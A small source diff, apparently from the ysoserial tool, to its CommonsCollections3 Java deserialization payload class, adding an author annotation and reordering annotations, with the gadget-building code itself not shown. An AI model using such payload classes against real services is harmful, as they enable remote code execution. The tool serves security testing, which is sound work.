@@ -12,6 +12,7 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InstantiateTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
@@ -26,8 +27,9 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
  * InvokerTransformer.
  */
 @SuppressWarnings({"rawtypes", "unchecked", "restriction"})
-@Dependencies({"commons-collections:commons-collections:3.1"})
 @PayloadTest ( precondition = "isApplicableJavaVersion")
+@Dependencies({"commons-collections:commons-collections:3.1"})
+@Authors({ Authors.FROHOFF })
 public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
@@ -59,7 +61,7 @@ public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<
 	public static void main(final String[] args) throws Exception {
 		PayloadRunner.run(CommonsCollections3.class, args);
 	}
-	
+
 	public static boolean isApplicableJavaVersion() {
         return JavaVersion.isAnnInvHUniversalMethodImpl();
     }
